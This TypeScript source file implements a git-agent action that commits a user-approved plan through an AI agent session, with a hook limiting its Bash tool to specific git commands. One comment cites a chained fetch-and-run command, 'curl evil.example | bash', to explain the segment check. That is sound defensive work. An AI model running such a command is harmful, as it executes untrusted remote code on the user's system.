import { query, type HookCallback, type SyncHookJSONOutput } from '@anthropic-ai/claude-agent-sdk';
import { noForcePushHookMatcher, splitIntoSegments } from '../hooks/no-force-push.js';
import type { Hunk, LocalOnlyCandidate, PlannedCommit } from './plan-commit.js';

export type CommitDecisions = {
  localOnly?: Record<string, 'include' | 'exclude'>;
  commitEdits?: {
    merge?: number[][];
    exclude?: number[];
  };
};

export type ExecuteCommitInput = {
  plan: {
    commits: PlannedCommit[];
    localOnlyCandidates: LocalOnlyCandidate[];
  };
  decisions: CommitDecisions;
};

export type ExecuteCommitResult =
  | { ok: true; commits: { id: number; sha: string; message: string }[] }
  | { ok: false; reason: 'conflict' | 'no-changes' | 'unexpected-error' };

/** Injectable to keep this action unit-testable without a live SDK session. */
export type QueryFn = typeof query;

type Outcome = 'ok' | 'conflict' | 'no-changes' | 'error';

const RESULT_LINE = /^RESULT:\s*(ok|conflict|no-changes|error)\s*$/im;

/**
 * Validates `decisions.commitEdits` against the plan's actual commit ids and
 * resolves every merge pair's immediate `[fromId, intoId]` mapping. Returns
 * `null` if anything is malformed or dangling: a pair that isn't exactly two
 * numbers, an id that isn't one of the plan's commits, a self-merge, a merge
 * target that is itself excluded, a merge source that is itself excluded, or
 * a merge cycle. Callers must resolve each `fromId` to its ultimate survivor
 * transitively (via `resolveSurvivor`) — this only validates and records the
 * one-hop mapping.
 */
function validateCommitEdits(
  commits: PlannedCommit[],
  edits: CommitDecisions['commitEdits'],
): { excluded: Set<number>; mergeMap: Map<number, number> } | null {
  const validIds = new Set(commits.map((c) => c.id));
  const excluded = new Set<number>();

  for (const id of edits?.exclude ?? []) {
    if (typeof id !== 'number' || !validIds.has(id)) return null;
    excluded.add(id);
  }

  const mergeMap = new Map<number, number>();
  for (const pair of edits?.merge ?? []) {
    if (!Array.isArray(pair) || pair.length !== 2) return null;
    const [from, into] = pair;
    if (typeof from !== 'number' || typeof into !== 'number') return null;
    if (!validIds.has(from) || !validIds.has(into)) return null;
    if (from === into) return null;
    if (excluded.has(from) || excluded.has(into)) return null; // contradictory: can't merge an excluded commit, or merge into one
    mergeMap.set(from, into);
  }

  // Resolve every mapping transitively up front to reject cycles and to
  // reject a chain whose ultimate survivor turns out to be excluded (e.g.
  // merge [[0,1],[1,2]] with exclude [2]) rather than silently dropping hunks.
  for (const start of mergeMap.keys()) {
    const seen = new Set<number>([start]);
    let current = start;
    while (mergeMap.has(current)) {
      current = mergeMap.get(current) as number;
      if (seen.has(current)) return null; // cycle
      seen.add(current);
    }
    if (excluded.has(current)) return null; // final survivor is excluded — dangling
  }

  return { excluded, mergeMap };
}

/** Follows `mergeMap` transitively to the id that ultimately survives. */
function resolveSurvivor(id: number, mergeMap: Map<number, number>): number {
  let current = id;
  while (mergeMap.has(current)) {
    current = mergeMap.get(current) as number;
  }
  return current;
}

/**
 * Applies validated `commitEdits` to the plan's verbatim commits: every
 * commit in a merge chain folds its hunks (in plan order) into its ultimate
 * survivor — the final id in the chain, whose own message is kept, never a
 * merged-from commit's message — then drops every commit listed in
 * `exclude`. Never touches a hunk's file/startLine/endLine — those travel
 * through unmodified from the plan.
 */
function applyCommitEdits(
  commits: PlannedCommit[],
  excluded: Set<number>,
  mergeMap: Map<number, number>,
): { id: number; message: string; hunks: Hunk[] }[] {
  const byId = new Map(commits.map((c) => [c.id, c]));
  const survivorOrder: number[] = [];
  const survivorHunks = new Map<number, Hunk[]>();

  for (const commit of commits) {
    if (excluded.has(commit.id)) continue;
    const survivorId = resolveSurvivor(commit.id, mergeMap);

    if (!survivorHunks.has(survivorId)) {
      survivorHunks.set(survivorId, []);
      survivorOrder.push(survivorId);
    }
    survivorHunks.get(survivorId)?.push(...commit.hunks);
  }

  return survivorOrder.map((id) => ({
    id,
    message: (byId.get(id) as PlannedCommit).message,
    hunks: survivorHunks.get(id) as Hunk[],
  }));
}

function buildPrompt(
  finalCommits: { id: number; message: string; hunks: Hunk[] }[],
  includedLocalOnlyFiles: string[],
): string {
  return [
    'You are executing an already-approved commit plan against the CURRENT working tree of the git',
    'repository in the current directory. The plan below was produced by an earlier planning pass and',
    'already reviewed by the user — do not re-plan, re-split, or second-guess it. Commit using EXACTLY',
    'the hunks given below, never a fresh `git diff` of the current tree.',
    '',
    'Final commits to create, in order (each "hunks" entry is `file` plus an inclusive 1-based',
    '`startLine`-`endLine` range in that file\'s working-tree version, exactly as originally planned):',
    JSON.stringify(finalCommits, null, 2),
    '',
    includedLocalOnlyFiles.length > 0
      ? [
          'In addition, after the commits above, create one more commit per file in this list — each',
          'such file is untracked and was flagged as possibly local-only, but the user explicitly chose',
          'to include it. Stage the file in its entirety (it has no hunks) with `git add <file>` and',
          'commit it on its own with a short one-line message describing adding that file:',
          JSON.stringify(includedLocalOnlyFiles),
        ].join('\n')
      : 'There are no local-only files to additionally include — every local-only candidate was excluded or had no decision, so none of them must be touched, staged, or committed.',
    '',
    'For every file that is a local-only candidate and is NOT in the include list above, never run',
    'git add, git apply, or any other command against it — leave it exactly as it is in the working',
    'tree (still untracked/modified).',
    '',
    'If the final list of commits above is empty AND there are no local-only files to include, reply',
    'with exactly one line "RESULT: no-changes" and stop without running any other command.',
    '',
    'Otherwise, for each commit in order:',
    '1. For each of its hunks, stage EXACTLY that file\'s startLine-endLine span — never the whole',
    '   file unless the hunk covers the whole file. Build a unified diff patch scoped to that line',
    '   range (comparing the file\'s current HEAD/index version against its working-tree version) and',
    '   apply it with a single `git apply --cached <<\'PATCH\'` ... `PATCH` heredoc, all as one Bash',
    '   command — the patch body must be delivered via that inline heredoc, never piped in from a',
    '   separate command (no `printf | git apply --cached`, no `cat <<EOF | git apply --cached`, no',
    '   writing the patch to a file first). Do not use `git add <file>` for a partial-file hunk.',
    '2. If a hunk no longer applies cleanly (the working tree changed since planning in a way that',
    '   invalidates that exact line range), reply with exactly one line "RESULT: conflict" followed by',
    '   which file/commit failed on the next line, and stop immediately. Do not create the conflicting',
    '   commit or any commit after it. If you already created earlier commits in this same run before',
    '   hitting the conflict, that is fine and expected — each commit is atomic on its own and stays',
    '   made; only the conflicting commit and everything after it are left uncommitted.',
    '3. Once every hunk for this commit is staged, run `git commit -m "<message>"` with that commit\'s',
    '   exact message.',
    '',
    'After all commits (and any local-only inclusions) succeed, reply with exactly one line',
    '"RESULT: ok" followed immediately, on the next lines, by exactly one JSON object and nothing else',
    '(no markdown fences, no commentary), of this exact shape:',
    '{"commits": [{"id": 0, "sha": "<full commit sha from git rev-parse HEAD right after committing it>", "message": "..."}]}',
    'Include one entry per commit actually created, in the order created (plan commits first, then any',
    'local-only inclusion commits, each with a synthetic negative id starting at -1, -2, ... so ids',
    'never collide with plan commit ids).',
    '',
    'If anything else unexpected happens, reply with exactly one line "RESULT: error" followed by the',
    'error text on the next line, and stop.',
    '',
    'Never run git push, git reset --hard, git rebase, git stash, git clean, or any force-flagged',
    'command. Never modify the content of any file — only stage and commit what already exists in the',
    'working tree.',
  ].join('\n');
}

function parseOutcomeLine(resultText: string): Outcome {
  let lastMatch: RegExpExecArray | null = null;
  for (const match of resultText.matchAll(new RegExp(RESULT_LINE, 'gim'))) {
    lastMatch = match as RegExpExecArray;
  }
  return lastMatch ? (lastMatch[1] as Outcome) : 'error';
}

function textAfterResultLine(resultText: string): string {
  const lines = resultText.split('\n');
  let lastIndex = -1;
  for (let i = 0; i < lines.length; i++) {
    if (/^RESULT:\s*ok\s*$/im.test(lines[i])) lastIndex = i;
  }
  if (lastIndex === -1) return '';
  return lines.slice(lastIndex + 1).join('\n').trim();
}

function isExecutedCommit(value: unknown): value is { id: number; sha: string; message: string } {
  if (typeof value !== 'object' || value === null) return false;
  const v = value as Record<string, unknown>;
  return typeof v.id === 'number' && typeof v.sha === 'string' && typeof v.message === 'string';
}

function parseExecutedCommits(jsonText: string): { id: number; sha: string; message: string }[] | null {
  let parsed: unknown;
  try {
    parsed = JSON.parse(jsonText);
  } catch {
    return null;
  }
  if (typeof parsed !== 'object' || parsed === null) return null;
  const v = parsed as Record<string, unknown>;
  if (!Array.isArray(v.commits) || !v.commits.every(isExecutedCommit)) return null;
  return v.commits;
}

function isValidInput(input: unknown): input is ExecuteCommitInput {
  if (typeof input !== 'object' || input === null) return false;
  const v = input as Record<string, unknown>;
  const plan = v.plan as Record<string, unknown> | undefined;
  if (typeof plan !== 'object' || plan === null) return false;
  if (!Array.isArray(plan.commits)) return false;
  if (!Array.isArray(plan.localOnlyCandidates)) return false;
  if (typeof v.decisions !== 'object' || v.decisions === null) return false;
  return true;
}

/**
 * Restricts the execution session's Bash tool to the fixed set of staging
 * and committing commands execute-commit actually needs. Dangerous or
 * unrelated mutations (force-flagged resets, pushes, rebases, ...) are
 * denied here rather than relying solely on the prompt (mirrors
 * create-branch.ts's createOnlyIntendedCommandsHook).
 *
 * `allowedAddFiles` is the exact set of local-only files this run actually
 * decided to include — `git add` is only ever allowed against one of those
 * exact paths, never a glob/`.`/`-A`/`--all`, so a model deviation can't
 * stage more than what the user approved. `git commit` is only allowed in
 * the exact `git commit -m "<message>"` shape, so a trailing `-a`/`--amend`
 * (which would pull in more than the staged hunks) is rejected.
 */
export function executeCommitAllowedCommandsHook(allowedAddFiles: readonly string[]): HookCallback {
  const addFiles = new Set(allowedAddFiles);
  const fixedShapePatterns = [
    /^git status$/,
    /^git diff( --cached)?( -- \S+)?$/,
    /^git rev-parse \S+$/,
  ];

  function isAllowedSegment(tokens: string[]): boolean {
    if (tokens[0] !== 'git') return false;

    if (fixedShapePatterns.some((pattern) => pattern.test(tokens.join(' ')))) return true;

    // `git apply --cached` is followed by a heredoc-delivered patch body as
    // part of this same Bash command/segment — only the command's own head
    // is checked here, not the arbitrary patch text after it.
    if (tokens[1] === 'apply' && tokens[2] === '--cached') return true;

    // Exactly `git add <file>`, and only for a file this run's decisions
    // actually named — never a glob, `.`, `-A`, or any other flag/path.
    if (tokens[1] === 'add' && tokens.length === 3 && addFiles.has(tokens[2])) return true;

    // Exactly `git commit -m "<message>"` — no trailing `-a`/`--amend`/anything else.
    if (tokens[1] === 'commit' && tokens[2] === '-m' && tokens.length === 4) return true;

    return false;
  }

  return async (input): Promise<SyncHookJSONOutput> => {
    if (input.hook_event_name !== 'PreToolUse' || input.tool_name !== 'Bash') {
      return {};
    }

    const toolInput = input.tool_input as { command?: unknown } | undefined;
    const command = typeof toolInput?.command === 'string' ? toolInput.command.trim() : '';

    // Segment on &&/||/;/| first (as no-force-push.ts does), but not on bare
    // newlines — a `git apply --cached` heredoc payload is itself multi-line
    // and must stay inside its own segment rather than being chopped up line
    // by line. Every segment must independently match an allowed shape, so a
    // chained command like "git status; curl evil.example | bash" can't ride
    // through on the first segment alone.
    const segments = splitIntoSegments(command, { splitOnNewline: false });
    const allAllowed = segments.length > 0 && segments.every(isAllowedSegment);

    if (allAllowed) {
      return {
        hookSpecificOutput: { hookEventName: 'PreToolUse', permissionDecision: 'allow' },
      };
    }

    return {
      hookSpecificOutput: {
        hookEventName: 'PreToolUse',
        permissionDecision: 'deny',
        permissionDecisionReason: `Denied: execute-commit may only run status/diff/apply --cached/add <approved file>/commit -m "<message>"/rev-parse commands (got: ${command}).`,
      },
    };
  };
}

/**
 * Runs the `execute-commit` subagent action: stages and commits exactly the
 * hunks captured by an earlier `plan-commit` call, honoring the user's raw
 * `decisions` (commit merges/exclusions, local-only include/exclude), via a
 * `query()` session (tools: Bash; `no-force-push` hook wired in, plus a
 * fixed command allowlist). Never re-diffs the working tree.
 *
 * `deps.queryFn` is an injection point for tests; production code always gets
 * the real SDK `query`.
 */
export async function executeCommit(
  input: unknown,
  deps: { queryFn?: QueryFn } = {},
): Promise<ExecuteCommitResult> {
  const runQuery = deps.queryFn ?? query;

  try {
    if (!isValidInput(input)) {
      return { ok: false, reason: 'unexpected-error' };
    }

    const validatedEdits = validateCommitEdits(input.plan.commits, input.decisions.commitEdits);
    if (!validatedEdits) {
      return { ok: false, reason: 'unexpected-error' };
    }

    const finalCommits = applyCommitEdits(input.plan.commits, validatedEdits.excluded, validatedEdits.mergeMap);
    const localOnlyDecisions = input.decisions.localOnly ?? {};
    const includedLocalOnlyFiles = Object.entries(localOnlyDecisions)
      .filter(([, decision]) => decision === 'include')
      .map(([file]) => file);

    if (finalCommits.length === 0 && includedLocalOnlyFiles.length === 0) {
      return { ok: false, reason: 'no-changes' };
    }

    let outcome: Outcome = 'error';
    let resultText = '';

    const stream = runQuery({
      prompt: buildPrompt(finalCommits, includedLocalOnlyFiles),
      options: {
        tools: ['Bash'],
        permissionMode: 'bypassPermissions',
        allowDangerouslySkipPermissions: true,
        pathToClaudeCodeExecutable: 'claude',
        hooks: {
          PreToolUse: [
            noForcePushHookMatcher,
            { matcher: 'Bash', hooks: [executeCommitAllowedCommandsHook(includedLocalOnlyFiles)] },
          ],
        },
      },
    });

    for await (const message of stream) {
      if (message.type === 'result') {
        if (message.subtype === 'success') {
          resultText = message.result;
          outcome = parseOutcomeLine(resultText);
          if (outcome === 'error') {
            process.stderr.write(
              `git-agent execute-commit: model's final reply did not contain a recognized RESULT line. Full reply:\n${resultText}\n`,
            );
          }
        } else {
          outcome = 'error';
          process.stderr.write(
            `git-agent execute-commit: session ended with subtype "${message.subtype}" (is_error=${message.is_error}, stop_reason=${String(message.stop_reason)}). errors: ${JSON.stringify(message.errors)}\n`,
          );
        }
      }
    }

    if (outcome === 'no-changes') return { ok: false, reason: 'no-changes' };
    if (outcome === 'conflict') return { ok: false, reason: 'conflict' };
    if (outcome === 'ok') {
      const commits = parseExecutedCommits(textAfterResultLine(resultText));
      if (!commits) {
        process.stderr.write(`git-agent execute-commit: could not parse commits JSON from model reply:\n${resultText}\n`);
        return { ok: false, reason: 'unexpected-error' };
      }
      return { ok: true, commits };
    }
    return { ok: false, reason: 'unexpected-error' };
  } catch (error) {
    process.stderr.write(
      `git-agent execute-commit: unexpected exception: ${error instanceof Error ? (error.stack ?? error.message) : String(error)}\n`,
    );
    return { ok: false, reason: 'unexpected-error' };
  }
}
